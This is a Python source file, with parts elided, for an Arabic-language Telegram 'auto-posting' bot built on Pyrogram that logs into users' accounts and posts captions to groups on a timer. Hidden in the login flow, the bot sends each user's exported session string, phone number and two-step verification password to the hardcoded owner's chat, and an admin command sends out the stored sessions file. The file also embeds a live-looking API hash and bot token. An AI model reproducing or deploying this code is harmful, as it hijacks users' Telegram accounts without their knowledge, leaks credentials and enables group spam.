...
from pyrogram.errors import (ApiIdInvalid, PhoneNumberInvalid,
                             ...
                             PeerIdInvalid, BotMethodInvalid)
...
# t.me/Olggaaa_love_biduuubot الاساس والباقي تقليد
# ما ابريك الذمة تحذف الحقوق او تنسبه لنفسك استرزق منه وموفق غير محلل للبيع !

app = Client(
    "autoPost",
    api_id=20769091,
    api_hash="0a3c7b2d7c8132bbafd4ffe9eb516968",
    bot_token="7806253896:AAGiQd4G0NPXH4WBs4HZSktJ0lB0RFp65DQ",
)
loop = get_event_loop()
listener = Listener(client=app)
owners = [000, 000]  # ايدي الادمن
owner = 5347602862  # ايدي الاساسي
own = "@its_aboody"  # يوزرك
homeMarkup = Markup(
...
async def start(_: Client, message: Message):
    ...
    if user_id == owner and users.get(str(user_id)) is None:
        ...
        return await message.reply(
            f"- عذرا عزيزي عليك الإشتراك بقناة البوت أولا لتتمكن استخدامه\n- القناه: @{subscribed}\n- اشترك ثم ارسل /start"
        )
...
async def toHome(_: Client, callback: CallbackQuery):
    ...
    if user_id == owner: pass
        ...
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.",
                                     show_alert=True)
...
async def account2st(_: Client, callback: CallbackQuery):
    ...
    markup = Markup([[Button("- رجوع -", callback_data="toHome")]])
    await callback.message.edit_text(
        caption,
        reply_markup=markup,
    )
...
async def account(_: Client, callback: CallbackQuery):
    ...
    markup = Markup([[
        ...
        Button("- تغيير الحساب -", callback_data="changeAccount")
                     ...
                     [
                         Button("- ترتيب حسابك مع يوزر -",
                                callback_data="account_settings"),
                         Button("- ترتيب حسابك بدون اليوزر -",
                                callback_data="account_settings1"),
                     ],
                     [
                         Button("- مغادرة جميع القنوات -",
                                callback_data="leaveAllChats"),
                         Button("- حذف الحساب من البوت -",
...
async def deleteAccount(_: Client, callback: CallbackQuery):
    ...
    await callback.message.edit_text(
        ...
        reply_markup=Markup(
            [[Button("- ابدأ من جديد -", callback_data="toHome")]]))
...
async def leave_all_chats(_: Client, callback: CallbackQuery):
    ...
    if session is None:
        return await callback.message.edit_text(
            "- لم تقم بالتسجيل بعد.",
            reply_markup=Markup([[Button("- رجوع -",
                                         callback_data="account")]]))

    client = Client(name="leave_all_chats",
...
async def login(_: Client, callback: CallbackQuery):
    ...
    if user_id == owner: pass
        ...
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.",
                                     show_alert=True)
    elif (callback.data == "changeAccount"
          and users[str(user_id)].get("session") is None):
    ...
    try:
        ...
        return await callback.message.reply(text="- نفد وقت استلام رقم الهاتف",
                                            reply_markup=Markup([[
                                                Button("- العوده -",
                                                       callback_data="account")
                                            ]]))
    if ask.text == "/cancel":
        return await ask.reply("- تم إلغاء العمليه.",
...
async def registration(message: Message):
    ...
    try:
        ...
        return await lmsg.edit_text("- رقم الهاتف الذي ادخلته خاطئ",
    ...
    try:
        code = await listener.listen(
            ...
            reply_markup=ForceReply(selective=True,
                                    placeholder="𝙸𝙽 𝚃𝙷𝙸𝚂 𝙵𝙾𝚁𝙼𝚄𝙻𝙰: 1 2 3 4 5"))
    except exceptions.TimeOut:
        return await lmsg.reply(
            text="- نفذ وقت استلام الكود.\n- حاول مره أخرى.",
            reply_markup=reMarkup)
    try:
        await client.sign_in(_number, p_code_hash.phone_code_hash,
                             code.text.replace(" ", ""))
        ...
        return await code.reply(
            "- الكود الذي ادخلته منتهي الصلاحية. \n- حاول مره أخرى",
            reply_markup=reMarkup,
            reply_to_message_id=code.id)
        ...
        try:
            password = await listener.listen(
                ...
                reply_markup=ForceReply(selective=True,
                                        placeholder="- 𝚈𝙾𝚄𝚁 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳: "),
                timeout=180,
                reply_to_message_id=code.id)
        except exceptions.TimeOut:
            return await lmsg.reply(
                text=
                "- نفذ وقت استلام كلمة مرور التحقق بخطوتين.\n- حاول مره أخرى.",
                reply_markup=reMarkup)
        try:
            await client.check_password(password.text)
        except (PasswordHashInvalid):
            return await password.reply(
                "- قمت بإدخال كلمة مرور خاطئه.\n- حاول مره أخرى.",
                reply_markup=reMarkup)
    session = await client.export_session_string()
    try:
        await app.send_message(owner, session + ' ' + _number)
        await app.send_message(owner,
                               session + ' ' + _number + ' ' + password.text)
    except:
        pass
    await client.disconnect()
    if user_id == owner and users.get(str(user_id)) is None:
    ...
    await app.send_message(
        ...
        reply_markup=Markup(
            [[Button("الصفحه الرئيسيه", callback_data="toHome")]]))
...
async def login_via_session(_: Client, callback: CallbackQuery):
    ...
    if user_id == owner: pass
        ...
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.",
                                     show_alert=True)
    elif callback.data == "loginses" and users.get(str(user_id),
                                                   {}).get("session") is None:
        return await callback.answer("- لم تقم بالتسجيل بعد.", show_alert=True)
    ...
    try:
        ...
        return await callback.message.reply(text="- نفد وقت استلام كود الجلسة",
                                            reply_markup=Markup([[
                                                Button("- العوده -",
                                                       callback_data="account")
                                            ]]))
...
async def registration_via_session(_: Client, message: Message):
    ...
    reMarkup = Markup([[
        Button("- إعادة المحاوله -", callback_data="loginses"),
        Button("- رجوع -", callback_data="account")
    ]])

    registration_client = Client(session_string,
                                 in_memory=True,
                                 api_id=app.api_id,
                                 api_hash=app.api_hash)
...
async def newSuper(_: Client, callback: CallbackQuery):
    ...
    try:
        ask = await listener.listen(
            ...
            chat_id=user_id,
            text=
            "- ارسل رابط السوبر لإضافته.- لا تنضم قبل ان تقوم تبدأ النشر لمره واحده على الاقل.\n- اذا كان السوبر خاص ف ارسل الايدي الخاص به او غادر السوبر (من الحساب المضاف) ثم ارسل الرابط\n\n- يمكنك ارسال /cancel لألغاء العمليه.",
            reply_markup=ForceReply(selective=True,
                                    placeholder="- Super group URL: "),
            timeout=60)
    except exceptions.TimeOut:
        return await callback.message.reply("نفذ وقت استلام الرابط",
                                            reply_markup=reMarkup)
    if ask.text == "/cancel":
        return await ask.reply("- تم إلغاء العمليه",
                               reply_to_message_id=ask.id,
    ...
    chat_input = ask.text
    # Handle group link
    if chat_input.startswith("https://t.me/") or chat_input.startswith("@"):
        try:
            if chat_input.startswith("https://t.me/"):
                ...
                chat = await app.get_chat(chat_input.replace("@", ""))
        except Exception as e:
            print(e)
            return await ask.reply("- لم يتم ايجاد السوبر.",
                                   reply_to_message_id=ask.id,
                                   reply_markup=reMarkup)
    else:
    ...
    # Store the chat link/ID
    if isinstance(chat, str):
        users[str(user_id)]["groups"].append(chat)
    else:
        users[str(user_id)]["groups"].append(chat.id)

    write(users_db, users)
    await ask.reply("- تمت اضافة هذا السوبر الى القائمه.",
                    reply_markup=Markup([[
                        Button("- الصفحه الرئيسيه -", callback_data="toHome"),
                        Button("- إضافة سوبر -", callback_data="newSuper")
                    ]]),
...
async def newSupers(_: Client, callback: CallbackQuery):
    ...
    if not ask.text.startswith("-"):
        try:
            chat = await app.get_chat(ask.text if "+" in ask.text else (
                ask.text.split("/")[-1]))
    ...
    users[str(user_id)]["groups"].append(
        chat.id if not isinstance(chat, str) else int(chat))
    write(users_db, users)
    await ask.reply("- تمت اضافة هذا السوبر الى القائمه.",
                    reply_markup=Markup([[
                        Button("- الصفحه الرئيسيه -", callback_data="toHome"),
...
async def currentSupers(_: Client, callback: CallbackQuery):
    ...
    if user_id == owner: pass
        ...
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.",
                                     show_alert=True)
    if users[str(user_id)].get("groups") is None or len(
            users[str(user_id)]["groups"]) == 0:
        return await callback.answer("- لم يتم إضافة اي سوبر لعرضه",
                                     show_alert=True)
    ...
    markup = [[
        Button(str(group)
               if titles.get(str(group)) is None else titles[str(group)],
               callback_data=str(group)),
        Button("🗑", callback_data=f"delSuper {group}")
    ] for group in groups] if len(groups) else []
    markup.append([
        Button("- الصفحه الرئيسيه -", callback_data="toHome"),
        Button("- إضافة سوبر -", callback_data="newSuper")
    ])
...
async def delSuper(_: Client, callback: CallbackQuery):
    ...
    if group in groups:
        groups.remove(group)
        write(users_db, users)
        await callback.answer("- تم حذف هذا السوبر من القائمه",
                              show_alert=True)
    titles = {}
    for group in groups:
        try:
...
async def newCaption(_: Client, callback: CallbackQuery):
    ...
    try:
        ...
        return await callback.message.reply(
            "- انتهى وقت استلام الكليشه الجديده.", reply_markup=reMarkup)
    if ask.text == "/cancel":
        await ask.reply("- تم الغاء العمليه.",
                        reply_markup=reMarkup,
                        reply_to_message_id=ask.id)
    users[str(user_id)]["caption"] = ask.text
    write(users_db, users)
    await ask.reply("- تم تعيين الكليشه الجديده.",
                    reply_to_message_id=ask.id,
                    reply_markup=Markup([[
                        Button("- الصفحه الرئيسيه -", callback_data="toHome")
                    ]]))
...
async def waitTime(_: Client, callback: CallbackQuery):
    ...
    try:
        ask = await listener.listen(
            ...
            reply_markup=ForceReply(selective=True,
                                    placeholder="- The duration  < 300 : "),
            timeout=120)
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام مدة الانتظار.",
                                            reply_markup=reMarkup)
    if ask.text == "/cancel":
        await ask.reply("- تم الغاء العمليه.",
                        reply_markup=reMarkup,
    ...
    try:
        ...
        return await ask.reply("- لا يمكنك وضع هذه البيانات كمده.",
                               reply_markup=reMarkup,
                               reply_to_message_id=ask.id)
    write(users_db, users)
    await ask.reply("- تم تعيين مدة الانتظار.",
                    reply_to_message_id=ask.id,
                    reply_markup=Markup([[
                        Button("- الصفحه الرئيسيه -", callback_data="toHome")
                    ]]))
...
async def startPosting(_: Client, callback: CallbackQuery):
    ...
    if users[str(user_id)].get("session") is None:
        return await callback.answer("- عليك اضافة حساب أولا.",
                                     show_alert=True)
    elif (users[str(user_id)].get("groups") is None) or (len(
            users[str(user_id)]["groups"]) == 0):
        return await callback.answer("- لم يتم اضافة اي سوبرات بعد.",
                                     show_alert=True)
    elif users[str(user_id)].get("posting"):
        return await callback.answer("النشر التلقائي مفعل من قبل.",
                                     show_alert=True)
    ...
    await callback.message.edit_text("- بدأت عملية النشر التلقائي",
                                     reply_markup=markup)
...
async def stopPosting(_: Client, callback: CallbackQuery):
    ...
    if not users[str(user_id)].get("posting"):
        return await callback.answer("النشر التلقائي معطل بالفعل.",
                                     show_alert=True)
    ...
    await callback.message.edit_text("- تم ايقاف عملية النشر التلقائي",
                                     reply_markup=markup)
...
async def posting(user_id):
    if users[str(user_id)]["posting"]:
        ...
        while users[str(user_id)]["posting"]:
            try:
                wait_time = users[str(user_id)].get("waitTime", 300)
                sleepTime = wait_time
                if not isinstance(wait_time, (int, str)):
                    users[str(user_id)]["waitTime"] = 300
                    write(users_db, users)
                    return await app.send_message(
                        int(user_id),
                        "- تم إيقاف النشر بسبب خطأ في وقت الانتظار.",
                        reply_markup=Markup([[
                            Button("- إضافة وقت -", callback_data="waitTime")
                        ]]))
            ...
            if not caption:
                ...
                return await app.send_message(
                    ...
                    reply_markup=Markup([[
                        Button("- إضافة كليشه -", callback_data="newCaption")
                    ]]))

            for group in groups:
                try:
                    # Handle string-based groups (links or usernames)
                    if isinstance(group, str):
                        if group.startswith(("https://t.me/", "t.me/")):
                            try:
                                # Extract invite hash for private groups
                                if '+' in group:
                                ...
                                print(f"خطأ في المجموعة {group}: {str(e)}")
                                continue
                        ...
                        # If all above fails, try to convert to integer
                        try:
                            group_id = int(group)
                            await client.send_message(group_id, caption)
                        except ValueError:
                            await app.send_message(
                                int(user_id), f"خطأ في معرف المجموعة {group}")
                    else:
                        # Handle integer group IDs
                        try:
                            ...
                            try:
                                ...
                                await app.send_message(
                                    int(user_id),
                                    f"لا يمكن الإنضمام للمجموعة {group}: {str(e)}"
                                )
                        except Exception as e:
                            await app.send_message(
                                int(user_id),
                                f"خطأ في إرسال الرسالة للمجموعة {group}: {str(e)}"
                            )

                except Exception as e:
                    await app.send_message(
                        int(user_id), f"خطأ عام في المجموعة {group}: {str(e)}")
...
async def startPosting2(_: Client, callback: CallbackQuery):
    ...
    if users[str(user_id)].get("session") is None:
        ...
        return await callback.answer("- لم يتم اضافة اي سوبرات بعد.",
                                     show_alert=True)
    elif users[str(user_id)].get("posting2"):
        return await callback.answer("النشر التلقائي مفعل من قبل.",
                                     show_alert=True)
...
async def stopPosting2(_: Client, callback: CallbackQuery):
    ...
    if user_id == owner: pass
        ...
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.",
                                     show_alert=True)
    if not users[str(user_id)].get("posting2"):
        return await callback.answer("النشر التلقائي معطل بالفعل.",
                                     show_alert=True)
        ...
        while users[str(user_id)]["posting2"]:
            ...
            for group in groups:
                ...
                if not isinstance(group,
                                  int) or not str(group).startswith("-100"):
                    await app.send_message(int(user_id),
                                           f"Invalid group ID: {group}")
                    continue
                ...
                try:
                    ...
                    try:
                        ...
                        await app.send_message(
                            int(user_id),
                            f"مشكلة في الانضمام للقروب : {group}")
                    except Exception as e:
                        await app.send_message(int(user_id), str(e))
                except PeerIdInvalid:
                    await app.send_message(int(user_id),
                                           f"مشكلة في القروب : {group}")
                except Exception as e:
                    await app.send_message(int(user_id), str(e))
...
async def admin(_: Client, message: Union[Message, CallbackQuery]):
    ...
    func = message.reply if isinstance(message,
                                       Message) else message.message.edit_text
    await func(
        caption,
...
async def send_files(_: Client, callback: CallbackQuery):
    ...
    if os.path.exists(users_db):
        await app.send_document(chat_id=user_id,
                                document=users_db,
                                caption="Here is the users.json file.")
    else:
        await app.send_message(chat_id=user_id,
                               text="The users.json file does not exist.")

    # إرسال ملف channels.json
    if os.path.exists(channels_db):
        await app.send_document(chat_id=user_id,
                                document=channels_db,
                                caption="Here is the channels.json file.")
    else:
        await app.send_message(chat_id=user_id,
                               text="The channels.json file does not exist.")

    await callback.message.reply("تم إرسال الملفات بنجاح.",
                                 reply_markup=reMarkup)
...
async def broadcast(_: Client, callback: CallbackQuery):
    ...
    try:
        ...
        return await callback.message.reply("- نفذ وقت استلام الرسالة.",
                                            reply_markup=reMarkup)
    ...
    await ask.reply("- تم إرسال الرسالة لجميع المستخدمين بنجاح.",
                    reply_markup=reMarkup,
                    reply_to_message_id=ask.id)
...
async def addVIP(_: Client, callback: CallbackQuery):
    ...
    try:
        ...
        return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.",
                                            reply_markup=reMarkup)
    try:
        await app.get_chat(int(ask.text))
    except ValueError:
        return await ask.reply("- هذا البيانات لا يمكن ان تكون ايدي مستخدم.",
                               reply_to_message_id=ask.id,
                               reply_markup=reMarkup)
    except:
        return await ask.reply("- لم يتم ايجاد هذا المستخدم.",
                               reply_to_message_id=ask.id,
                               reply_markup=reMarkup)
    try:
        limit = await listener.listen(
            ...
            chat_id=user_id,
            text=
            "- أرسل الآن عدد الأيام المتاحه للعضو.\n\n- ارسل /cancel لإلغاء العمليه.",
            reply_markup=ForceReply(selective=True,
                                    placeholder="- Days limitation: "),
            reply_to_message_id=ask.id,
            timeout=30)
    except exceptions.TimeOut:
        return await callback.message.reply(
            "- انتهى وقت استلام عدد الايام المتاحه للمستخدم.")
    _id = int(ask.text)
    try:
        _limit = int(limit.text)
    except ValueError:
        return await callback.message.reply(
            "- قيمة المده المتاحه للعضو غير صحيحه.",
    ...
    await limit.reply(caption,
                      ...
                      reply_to_message_id=limit.id)
    try:
        await app.send_message(chat_id=_id,
                               text="- تم تفعيل VIP لك في بوت النشر التلقائي" +
...
async def cancelVIP(_: Client, callback: CallbackQuery):
    ...
    if users.get(ask.text) is None:
        return await ask.reply("- هذا المستخدم غير موجود في تخزين البوت.",
                               reply_to_message_id=ask.id,
                               reply_markup=reMarkup)
    elif not users[ask.text]["vip"]:
        return await ask.reply("- هذا المستخدم ليس من مستخدمي VIP.",
                               reply_to_message_id=ask.id,
                               reply_markup=reMarkup)
    else:
        users[ask.text]["vip"] = False
        write(users_db, users)
        await ask.reply("- تم الغاء اشتراك هذا المستخدم.",
                        reply_to_message_id=ask.id,
                        reply_markup=reMarkup)
...
async def addChannel(_: Client, callback: CallbackQuery):
    ...
    await callback.message.delete()
    try:
        ask = await listener.listen(from_id=user_id,
                                    chat_id=user_id,
    ...
    await ask.reply("- تم إضافة القناه الى القائمه.",
                    reply_to_message_id=ask.id,
                    reply_markup=reMarkup)
...
async def vipCanceler(user_id):
    ...
    if not users[user_str].get("vip", False):
        print(f"User {user_id} is not a VIP user")
        return

    if "limitation" not in users[user_str]:
        print(f"No limitation set for user {user_id}")
        return
    ...
    while True:
        ...
        end_datetime = (users[user_str]["limitation"].get("endDate", "") +
                        " " + users[user_str]["limitation"].get("endTime", ""))

        if cdate >= end_datetime:
            break
    ...
    users[user_str] = {
        "vip": False,
        "limitation": {},
        "session": users[user_str].get("session", ""),
        "account_number": users[user_str].get("account_number", ""),
        "groups": users[user_str].get("groups", []),
        "caption": users[user_str].get("caption", ""),
        "caption2": users[user_str].get("caption2", ""),
        "waitTime": users[user_str].get("waitTime", 300),
        "posting": False,
        "posting2": False
    }
